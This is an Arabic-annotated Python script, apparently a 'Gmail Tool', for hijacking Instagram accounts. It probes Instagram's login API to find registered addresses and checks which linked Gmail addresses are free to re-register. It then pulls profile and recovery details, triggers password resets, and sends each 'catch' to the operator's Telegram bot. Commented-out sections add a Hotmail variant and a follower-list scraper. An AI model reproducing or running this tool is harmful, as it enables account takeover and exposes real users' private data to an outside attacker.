import os
import time
try :
    import requests
    import user_agent
    import datetime
    import webbrowser
    import pyfiglet
    import threading
    import signal
except ImportError as error :
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install datetime')
    os.system('pip install webbrowser')
    os.system('pip install pyfiglet')
    os.system('pip install threading')
    os.system('pip install signal')
    os.system('cls'if os.name=='nt' else'clear')
    time.sleep(1)
    print('Done.')
    exit()
import requests
import os
from uuid import uuid4
import random
from user_agent import generate_user_agent
import datetime
import json
from time import sleep
from os import system
from datetime import date
import socket
a=0
z=0
b=0
j=0
m=0
ruu=0
ru=0
ma=0
bp =0
bk=0
bd=0
k=0
t=0
x=0
g=0
L=0
h=0
A=0
f=0
Ru = 0
qw =0
ya =0
yaa=0
hh=0
h=0
hhh=0
yaaa=0
E=0
zaidip = socket.gethostname()
ipzaid = socket.gethostbyname(zaidip)
#pas = input('Enter Your ID ')
#if pas=="87kk":
#	system('clear')
#else:
#	system('clear')

#pas = input('\033[1;35m# ID : ')
#if pas =='Zaid.Zaid':
#	system('clear')
#else:
#	system('clear')
#	print('\033[1;32m# ID False')
#	exit()
print('\n\033[1;33m\rGmail Tool 0.4\n')
print('\033[1;32mThe Tool Free <> MVMVP - W_Y67 <> IRAQ\n')
ll= datetime.datetime.now()
r = requests.session()
lll = date.today()
r = requests.session()
print('\033[1;36mTele @MVMV - @W_Y67\n')
	


	
def Gmail():
	
	try:
		fie =open('gmail.txt','r').read().splitlines()
	except FileNotFoundError as error:
		system('clear')
		print('File Error gmail.txt')
		exit()
	cookies =input("🔹 Sen ID - سيشن ايدي : ")
		
		
	took =input('\033[1;36m🔹 Token Bot - توكن البوت  :  ')
	if took=='':
		system('clear')
		print('Tok False')
		exit()
	try:
		idddd =int(input('\033[1;34m🔹 ID Account - ايدي تلكرام : '))
	except ValueError as error:
		system('clear')
		print('ID False')
		exit()
	system('clear')
		
		
	global z,a,x,lll,j,g,t,L,f,qw,E,h,A,Ru,ruu,ru,bd,bk,ma,bp,ya,yaa,yaaa,hh,h,hhh
	for BL in fie:
		if ('@gmail.com') in BL:
		
		
			
			url = 'https://b.i.instagram.com/api/v1/accounts/login/'
			KLL= BL.split('@')[0]
			headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
			uid = str(uuid4())
			data = {
			'uuid':uid, 
			'password':'ffffdddddaaa666', 
			'username':'{}' .format(BL),
			'device_id':uid, 
			'from_reg':'false', 
			'_csrftoken':'missing', 
			'login_attempt_countn':'0'
			}
			
			
			
			
			
			try:
				re = requests.post(url,headers=headers,data=data).text
				
			
				
			except requests.exceptions.ConnectionError as error:
				system('clear')
				print('intrinet Error * حدث خطأ في الاتصال')
				exit()
			
			if ('"invalid_user"')in re:
				os.system('cls'if os.name=='net'else'clear')
				ma+=1
				print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
			elif ('"bad_password"') in re:
				
				url3 ='https://android.clients.google.com/setup/checkavail'
				headers = {
	        		'Content-Length':'98',
	        		'Content-Type':'text/plain; charset=UTF-8',
	        		'Host':'android.clients.google.com',
	        		'Connection':'Keep-Alive',
	        		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
				data= json.dumps({
	        		'username':BL,
	        		'version':'3',
	        		'firstName':'AbaLahb',
	        		'lastName':'AbuJahl'})
	        	
				
				try:
					res=requests.post(url3,headers=headers,data=data)
				except requests.exceptions.ConnectionError as error:
					system('clear')
					print('intrinet Error * حدث خطأ في الاتصال')
					exit()
					
				if res.json()['status'] =='USERNAME_UNAVAILABLE':
					os.system('cls'if os.name=='net'else'clear')
					bd+=1
					print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
				elif res.json()['status'] =='SUCCESS':
						with open('True.txt','a') as f8:
							f8.write(f'{BL}\n')
						os.system('cls'if os.name=='net'else'clear')
						L+=1
						print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
						urlr='https://www.instagram.com/accounts/account_recovery_ajax/'
						headr= {
					        'accept': '*/*',
					        'accept-encoding': 'gzip, deflate, br',
					        'accept-language': 'en-US,en;q=0.9',
					        'content-length': '336',
					        'content-type': 'application/x-www-form-urlencoded',
					        'cookie': 'mid=YuPxZAABAAEUVYcD2B0cFEzLEyuU; ig_did=50092572-86B8-4779-8D7D-ED783D6BE001; dpr=3; datr=lPHjYm79ZCBQZ-8kyLncySC7; shbid="572\05454072972258\0541691059333:01f70b5caa78629654a33ffe9055bdc7663b824064ba3854ecfade7109c72ee455eb5eb8"; shbts="1659523333\05454072972258\0541691059333:01f7ce1fd97040b48210c72b760bfbbf68254544b85860f356f3dc04622ee5bfd6edb2d9"; rur="RVA\05454072972258\0541691069797:01f7513337be7c4309672fc0a95436c4f0b60d9f1ff74355b61efadb1b1079fb38505eea"; csrftoken=tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
					        'origin': 'https://www.instagram.com',
					        'referer': 'https://www.instagram.com/',
					        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
					        'sec-ch-ua-mobile': '?0',
					        'sec-fetch-dest': 'empty',
					        'sec-fetch-mode': 'cors',
					        'sec-fetch-site': 'same-origin',
					        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
					        'viewport-width': '30',
					        'x-asbd-id': '437806',
					        'x-csrftoken': 'tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
					        'x-ig-app-id': '936619743392459',
					        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
					        'x-instagram-ajax': 'caee87137ae9',
					        'x-requested-with': 'XMLHttpRequest'
						}
						datar={
							'query': f'{BL}'
						}
						rq = requests.post(urlr,headers=headr,data=datar).json()
						#print(rq)
						try:
							B19 =f"{BL}"
							fa =str(rq['options']['can_use_facebook'])
							if fa =='True':
								L3 = 'مرتبط في الفيس بوك'
							else:
								L3='غير مرتبط في الفيس بوك'
							ph = str(rq['options']['can_send_phone'])
							if ph =='True':
								L5 = ('مرتبط برقم')
							else:
								L5='غير مرتبط برقم'
						except KeyError as Error:
							L7 ='الريست لا يعمل'
						G1 = (KLL)
						iip=(G1)
						
						
						url22 = f'https://www.instagram.com/{iip}/?__a=1&__d=dis'
						head1 = {
			                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			                'accept-encoding': 'gzip, deflate, br',
			                'accept-language': 'en-US,en;q=0.9',
			                'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}',
			                'referer': 'https://www.instagram.com/{}/'.format(iip),
			                'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
			                'sec-ch-ua-mobile': '?1',
			                'sec-fetch-dest': 'document',
			                'sec-fetch-mode': 'navigate',
			                'sec-fetch-site': 'snone',
			                'upgrade-insecure-requests': '1',
			                'user-agent': generate_user_agent(),
						}
						rr =requests.get(url22,headers=head1).json()
						#print(rr)
						try:
							nam = str(rr['graphql']['user']['full_name'])
							iddd = str(rr['graphql']['user']['id'])
							fol = str(rr['graphql']['user']['edge_followed_by']['count'])
							fols =str(rr['graphql']['user']['edge_follow']['count'])
							isp = str(rr['graphql']['user']['is_private'])
							bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
							re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
							ree = re.json()
							dat = ree['data']
							j+=1
							headers = {
        # 'Content-Length': '305',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com',
        'Connection': 'Keep-Alive',
        'User-Agent': 'Instagram 6.12.1 Android (25/7.1.2; 160dpi; 383x680; LENOVO/Android-x86; 4242ED1; x86_64; android_x86_64; en_US)',
        # Requests sorts cookies= alphabetically

        'Accept-Language': 'en-US',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': 'AQ==',
        # 'Accept-Encoding': 'gzip',
							}
							data = {
        'ig_sig_key_version': '4',
        "user_id":iddd
							}
							res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers, data=data).json()
							rs =str(res['obfuscated_email'])
							try:
								tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text=🗿 〝 حيآڪ الُِله ، رقمِ الصيدِ 〞 {j}\n--------------------------------\n📟 〝 آسم آلُِمستخـدِم 〞 : {iip}\n🗞️ 〝 الاسہم 〞  {nam}\n📧 〝 آلبَريد 〞 : {iip}@gmail.com\n🚻 〝 عدد المتہٰابعيٰن 〞 : {fol}\n👥 〝 يٰتہٰابع 〞 : {fols}\n🗺 〝 عدد المنشوراتہ 〞 : {bio}\n⌛️ 〝 تاريخ انشاء الحسہٰابٰٰ 〞 : {dat}\n🔐 〝 خـصوُصية الُحسابَ 〞 : {isp}\n🛡️〝 الُِفيسبوُڪ 〞 : {L3}\n📲 〝 رقٌم الهاتفُ 〞  : {L5}\n🔁 〝 رٍيست الُحسابَ 〞 : يعمل\n♼ 〝 رٍيست الُِبَاسورد 〞 : {rs} \n⌚️ 〝 تہاريخ الصہٰيٰد 〞 : {lll}\n————————×————————\n♜ 〝 حـــقٌــوُقٌـ,ـ 〞 : @MVMVP ↷ @W_Y67 \n\nالُمبرمج زْيد ڪرٍيم')
								ru= requests.post(tlg)
							except UnboundLocalError as error:
								L+=1
								os.system('cls'if os.name=='net'else'clear')
								print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
								tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text=🗿 〝 حيآڪ الُِله ، رقمِ الصيدِ 〞 {j}\n--------------------------------\n📟 〝 آسم آلُِمستخـدِم 〞 : {iip}\n🗞️ 〝 الاسہم 〞  {nam}\n📧 〝 آلبَريد 〞 : {iip}@gmail.com\n🚻 〝 عدد المتہٰابعيٰن 〞 : {fol}\n👥 〝 يٰتہٰابع 〞 : {fols}\n🗺 〝 عدد المنشوراتہ 〞 : {bio}\n⌛️ 〝 تاريخ انشاء الحسہٰابٰٰ 〞 : {dat}\n🔐 〝 خـصوُصية الُحسابَ 〞 : {isp}\n🛡️〝 الُِفيسبوُڪ 〞 : {L3}\n📲 〝 رقٌم الهاتفُ 〞  : {L5}\n🔁 〝 رٍيست الُحسابَ 〞 : يعمل\n⌚️ 〝 تہاريخ الصہٰيٰد 〞 : {lll}\n————————×————————\n♜ 〝 حـــقٌــوُقٌـ,ـ 〞 : @MVMVP ↷ @W_Y67 \n\nالُمبرمج زْيد ڪرٍيم')
								ru= requests.post(tlg)
								
								
							
								
						except KeyError as error :
							E+=1
							os.system('cls'if os.name=='net'else'clear')
							print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
#########Hotmail#########



#def hotmail():
#	
#	try:
#		fie =open('hotmail.txt','r').read().splitlines()
#	except FileNotFoundError as error:
#		system('clear')
#		print('File Error hotmail.txt')
#		exit()
#	global z,a,x,lll,j,g,t,L,f,qw,E,h,A,Ru,ruu,ru,bd,bk,ma,bp,ya,yaa,yaaa,hh,h,hhh
#		
#	l7 = fie
#	
#	for BL in l7:
#		
#		if ('@hotmail.com') in BL:
#		
#		
#			
#			url = 'https://b.i.instagram.com/api/v1/accounts/login/'
#			KLL= BL.split('@')[0]
#			headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
#			uid = str(uuid4())
#			data = {
#			'uuid':uid, 
#			'password':'ffffdddddaaa666', 
#			'username':'{}' .format(BL),
#			'device_id':uid, 
#			'from_reg':'false', 
#			'_csrftoken':'missing', 
#			'login_attempt_countn':'0'
#			}
#			
#			
#			
#			
#			
#			try:
#				re = requests.post(url,headers=headers,data=data).text
#				
#			
#				
#			except requests.exceptions.ConnectionError as error:
#				system('clear')
#				print('intrinet Error * حدث خطأ في الاتصال')
#				exit()
#			
#			if ('"invalid_user"')in re:
#				os.system('cls'if os.name=='net'else'clear')
#				hhh+=1
#				print(f'\033[1;32m<> Gmail - [{L}]\033[1;33m - [{bd}] - [{ma}]\n\033[1;32m<> Hotma - [{h}] \033[1;33m- [{hh}] - [{hhh}]\n\033[1;36m<> Error - \033[1;35m[{E}]\n')
#			elif ('"bad_password"') in re:
#				url3 ='https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=' +BL+ '&_=1604288577990'
#				headers = {
#	    	"Accept": "*/*",
#	    	"Content-Type": "application/x-www-form-urlencoded",
#    		"User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
#    		"Connection": "close",
#    		"Host": "odc.officeapps.live.com",
#    		"Accept-Encoding": "gzip, deflate",
#    		"Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
#    		"Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
#    		"canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
#    		"uaid": "d06e1498e7ed4def9078bd46883f187b",
#    		"Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"
#    }
#				data = ''
#					
#	        	
#				
#				try:
#					res=requests.post(url3,headers=headers,data=data)
#				except requests.exceptions.ConnectionError as error:
#					system('clear')
#					print('intrinet Error * حدث خطأ في الاتصال')
#					exit()
#					
#				#if res.json()['status'] =='USERNAME_UNAVAILABLE':
#					
#				if 'Neither' in res:
#						with open('True.txt','a') as f8:
#							f8.write(f'{BL}\n')
#						os.system('cls'if os.name=='net'else'clear')
#						h+=1
#						print(f'\033[1;32m<> Gmail - [{L}]\033[1;33m - [{bd}] - [{ma}]\n\033[1;32m<> Hotma - [{h}] \033[1;33m- [{hh}] - [{hhh}]\n\033[1;36m<> Error - \033[1;35m[{E}]\n')
#						url ='https://www.instagram.com/accounts/account_recovery_ajax/'
#						head= {
#					        'accept': '*/*',
#					        'accept-encoding': 'gzip, deflate, br',
#					        'accept-language': 'en-US,en;q=0.9',
#					        'content-length': '336',
#					        'content-type': 'application/x-www-form-urlencoded',
#					        'cookie': 'mid=YPvYkQALAAH7ZlNgkXiBnW6y7AOy; ig_did=1C396C9B-7DC7-463E-A68B-FE991198F88A; ig_nrcb=1; shbid="944\0546317830362\0541658653745:01f7bf09c30c2bf6ae86e32af31b5991cd84a607e1547a0132f6b653c4b76ecc26abbc4e"; shbts="1627117745\0546317830362\0541658653745:01f716bcf5ca94c711aa8ee17e52cf927685a30c29c89e0310cfe9f86589901109fd5b1e"; rur="RVA\05448065200129\0541658659405:01f7d96b5f9c1cf2396b6d00cbc7281da4dc2bb4c75a035bf4917e188315d170aec60aa2"; csrftoken=mWehV8ELhUeOnA4aWc43a7PplDLL0jNL',
#					        'origin': 'https://www.instagram.com',
#					        'referer': 'https://www.instagram.com/',
#					        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
#					        'sec-ch-ua-mobile': '?0',
#					        'sec-fetch-dest': 'empty',
#					        'sec-fetch-mode': 'cors',
#					        'sec-fetch-site': 'same-origin',
#					        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
#					        'x-asbd-id': '437806',
#					        'x-csrftoken': 'mWehV8ELhUeOnA4aWc43a7PplDLL0jNL',
#					        'x-ig-app-id': '936619743392459',
#					        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
#					        'x-instagram-ajax': 'caee87137ae9',
#					        'x-requested-with': 'XMLHttpRequest'
#					    }
#						data={
#							'query': '{}'.format(BL)
#		}
#						rq = requests.post(url,headers=head,data=data).json()
#						
#						try:
#							fa =str(rq['options']['can_use_facebook'])
#							if fa =='True':
#								L3 = 'مرتبط في الفيس بوك'
#								
#							else:
#								L3='غير مرتبط في الفيس بوك'
#							ph = str(rq['options']['can_send_phone'])
#							if ph =='True':
#								L5 = ('مرتبط برقم')
#							else:
#								L5='غير مرتبط برقم'
#						except KeyError as Error:
#							L7 ='الريست لا يعمل'
#						G1 = (KLL)
#						iip=(G1)
#						try:
#							
#							fi1 = open('cookies.txt','r').read().splitlines()
#						except FileNotFoundError as error:
#							system('clear')
#							print('Error File Cookies')
#							exit('')
#						url22 = f'https://www.instagram.com/{iip}/?__a=1&__d=dis'
#						head1 = {
#			                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
#			                'accept-encoding': 'gzip, deflate, br',
#			                'accept-language': 'en-US,en;q=0.9',
#			                'cookie': '{}'.format(fi1),
#			                'referer': 'https://www.instagram.com/{}/'.format(iip),
#			                'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
#			                'sec-ch-ua-mobile': '?1',
#			                'sec-fetch-dest': 'document',
#			                'sec-fetch-mode': 'navigate',
#			                'sec-fetch-site': 'snone',
#			                'upgrade-insecure-requests': '1',
#			                'user-agent': generate_user_agent(),
#			        
#			            }
#						rr = requests.get(url22,headers=head1).json()
#						try:
#							nam = str(rr['graphql']['user']['full_name'])
#							iddd = str(rr['graphql']['user']['id'])
#							fol = str(rr['graphql']['user']['edge_followed_by']['count'])
#							fols =str(rr['graphql']['user']['edge_follow']['count'])
#							isp = str(rr['graphql']['user']['is_private'])
#							bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
#							re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
#							ree = re.json()
#							dat = ree['data']
#							j+=1
#							try:
#								
#							
#								
#								tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text=🗿 〝 حيآڪ الُِله ، رقمِ الصيدِ 〞 {j}\n--------------------------------\n📟 〝 آسم آلُِمستخـدِم 〞 : {iip}\n🗞️ 〝 الاسہم 〞  {nam}\n📧 〝 آلبَريد 〞 : {iip}@gmail.com\n🚻 〝 عدد المتہٰابعيٰن 〞 : {fol}\n👥 〝 يٰتہٰابع 〞 : {fols}\n🗺 〝 عدد المنشوراتہ 〞 : {bio}\n⌛️ 〝 تاريخ انشاء الحسہٰابٰٰ 〞 : {dat}\n🔐 〝 خـصوُصية الُحسابَ 〞 : {isp}\n🛡️〝 الُِفيسبوُڪ 〞 : {L3}\n📲 〝 رقٌم الهاتفُ 〞  : {L5}\n🔁 〝 رٍيست الُحسابَ 〞 : يعمل\n♼ 〝 رٍيست الُِبَاسورد 〞 : {rs} \n⌚️ 〝 تہاريخ الصہٰيٰد 〞 : {lll}\n————————×————————\n♜ 〝 حـــقٌــوُقٌـ,ـ 〞 : @MVMVP ↷ @W_Y67 \n\nالُمبرمج زْيد ڪرٍيم')
#								ru= requests.post(tlg)
#							except UnboundLocalError as error:
#								hhh+=1
#								os.system('cls'if os.name=='net'else'clear')
#								print(f'\033[1;32m<> Gmail - [{L}]\033[1;33m - [{bd}] - [{ma}]\n\033[1;32m<> Hotma - [{h}] \033[1;33m- [{hh}] - [{hhh}]\n\033[1;36m<> Error - \033[1;35m[{E}]\n')
#								
#								
#						except KeyError as error:
#							E+=1
#							os.system('cls'if os.name=='net'else'clear')
#							print(f'\033[1;32m<> Gmail - [{L}]\033[1;33m - [{bd}] - [{ma}]\n\033[1;32m<> Hotma - [{h}] \033[1;33m- [{hh}] - [{hhh}]\n\033[1;36m<> Error - \033[1;35m[{E}]\n')
#			
#					
#				else:
#					os.system('cls'if os.name=='net'else'clear')
#					hh+=1
#					print(f'\033[1;32m<> Gmail - [{L}]\033[1;33m - [{bd}] - [{ma}]\n\033[1;32m<> Hotma - [{h}] \033[1;33m- [{hh}] - [{hhh}]\n\033[1;36m<> Error - \033[1;35m[{E}]\n')
					
				
						



##############################
#def zaid9():
#    global a,z,t,x
#    username = input('\033[1;34m[+] - Enter Your Username : ')
#    sleep(1)
#    system('clear')
#    passowrd = input('\033[1;35m[+] - Enter Your Password : ')
#    sleep(1)
#    system('clear')

#    c ='https://www.instagram.com/accounts/login/ajax/'
#    head1 = {
#        'accept': '*/*',
#        'accept-encoding': 'gzip, deflate, br',
#        'accept-language': 'en-US,en;q=0.9',
#        'content-length': '336',
#        'content-type': 'application/x-www-form-urlencoded',
#        'cookie': 'mid=YPvYkQALAAH7ZlNgkXiBnW6y7AOy; ig_did=1C396C9B-7DC7-463E-A68B-FE991198F88A; ig_nrcb=1; shbid="944\0546317830362\0541658653745:01f7bf09c30c2bf6ae86e32af31b5991cd84a607e1547a0132f6b653c4b76ecc26abbc4e"; shbts="1627117745\0546317830362\0541658653745:01f716bcf5ca94c711aa8ee17e52cf927685a30c29c89e0310cfe9f86589901109fd5b1e"; rur="RVA\05448065200129\0541658659405:01f7d96b5f9c1cf2396b6d00cbc7281da4dc2bb4c75a035bf4917e188315d170aec60aa2"; csrftoken=mWehV8ELhUeOnA4aWc43a7PplDLL0jNL',
#        'origin': 'https://www.instagram.com',
#        'referer': 'https://www.instagram.com/',
#        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
#        'sec-ch-ua-mobile': '?0',
#        'sec-fetch-dest': 'empty',
#        'sec-fetch-mode': 'cors',
#        'sec-fetch-site': 'same-origin',
#        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
#        'x-asbd-id': '437806',
#        'x-csrftoken': 'mWehV8ELhUeOnA4aWc43a7PplDLL0jNL',
#        'x-ig-app-id': '936619743392459',
#        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
#        'x-instagram-ajax': 'caee87137ae9',
#        'x-requested-with': 'XMLHttpRequest'
#    }
#    tim = str(time.time()).split('.')[1]
#    data1 = {
#        'username': username,
#        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{passowrd}',
#        'queryParams': '{}',
#        'optIntoOneTap': 'false',
#        'trustedDeviceRecords': '{}'
#    }
#    rq = requests.post(c,headers=head1,data=data1)
#    
#    
#    if ('"userId"') in rq.text:
#        
#        
#        
#        co = rq.cookies
#        coo =co.get_dict()
#        #sa = str(coo['sessionid'])
#        #print(sa)
#        
#        #exit()
#        tok = coo['csrftoken']
#        cookiee = f"sessionid={coo['sessionid']};ds_user_id={coo['ds_user_id']};csrftoken={coo['csrftoken']}"
#        try:
#        	os.remove('cookies.txt')
#        except FileNotFoundError as error:
#        	with open('cookies.txt','a') as f8:
#        		f8.write(f'{cookiee}')
#        	
#        
#       
#        with open('cookies.txt','a') as f8:
#        	f8.write(f'{cookiee}')
#        iii = input('Enter Your User list : ')
#        url22 = f'https://www.instagram.com/{iii}/?__a=1&__d=dis'
#        head1 = {
#	            'accept': '*/*',
#	            'accept-encoding': 'gzip, deflate, br',
#	            'accept-language': 'en-US,en;q=0.9',
#	            'cookie': f'{cookiee}',
#	            'referer': 'https://www.instagram.com/{}/'.format(iii),
#	            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
#	            'sec-ch-ua-mobile': '?0',
#	            'sec-fetch-dest': 'empty',
#	            'sec-fetch-mode': 'cors',
#	            'sec-fetch-site': 'same-origin',
#	            'user-agent': generate_user_agent(),
#	            'x-asbd-id': '437806',
#	            'x-ig-app-id': '936619743392459',
#	            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
#	            'x-requested-with': 'XMLHttpRequest'
#	        }
#	    
#        
#        
#        try:
#        	rr = requests.get(url22,headers=head1).json()
#        	
#        except json.decoder.JSONDecodeError as error:
#        	system('clear')
#        	print('* \033[1;32mBloked or Band Account')
#        	exit()
#        	
#        try:
#         fol = str(rr['graphql']['user']['edge_follow']['count'])
#         idd = str(rr['logging_page_id'])
#         ss = idd.split('_')[1]
#        except KeyError as error :
#             print('plsess user True...!')
#             exit()
#        x = int(fol)
#        url4 = f'https://i.instagram.com/api/v1/friendships/{ss}/following/?count={fol}'
#        head4 ={
#	            'accept': '*/*',
#	            'accept-encoding': 'gzip, deflate, br',
#	            'accept-language': 'en-US,en;q=0.9',
#	            'cookie': cookiee,
#	            'referer': 'https://www.instagram.com/',
#	            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
#	            'sec-ch-ua-mobile': '?0',
#	            'sec-fetch-dest': 'empty',
#	            'sec-fetch-mode': 'cors',
#	            'sec-fetch-site': 'same-origin',
#	            'user-agent': generate_user_agent(),
#	            'x-asbd-id': '437806',
#	            'x-ig-app-id': '936619743392459',
#	            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
#	            'x-requested-with': 'XMLHttpRequest'
#	
#	        }
#        data4 ={
#        	'count': fol
#	        }
#        re = requests.get(url4,headers=head4,data=data4).json()
#      
#        try:
#        	for zaid in range(0,x):
#        	    us = str(re['users'][zaid]['username'])
#	            a+=1 
#	            os.system('cls' if os.name == 'nt' else'clear')
#	
#	            print(f'\033[1;35m[=] - Done >> [{a}]\n[=] - User >> \033[1;36m[{us}]\n\033[1;35m[=] - Time >> [{ll}]\n')
#	            with open('gmail.txt','a') as f9:
#	            	f9.write(f'{us}@gmail.com\n')
#	 
#	                
#	                
#	           
#	              
#        except IndexError as error :
#	        print('Error...Tools')
#	        exit()
#    #else
#    elif ('"checkpoint_required"') in rq.text:
#    	print('Scuuer')
#    	exit()
#    	R = (rq.json())
#    	
#    	r5= str(R['checkpoint_url'])
#    	
#    	
#    	
#    	Uq = 'https://www.instagram.com/challenge/action/AXFRszJ55nzl0Qg_RJIUTM3aG1JgGjTnztwyDHLgri6O1hqVLmbVBrYirM7B-FPK9dE/LRfXZtYICOdbrqDh/ffc_J2wnyTn80kY64OCovuh64kmvN2Vg2QPrI3m8eR478msNmUQBF4CMsUOeziaQehdI/'
#    	head11 = {
#	            'accept': '*/*',
#	            'accept-encoding': 'gzip, deflate, br',
#	            'accept-language': 'en-US,en;q=0.9',
#	            'content-length': '8',
#	            'content-type': 'application/x-www-form-urlencoded',
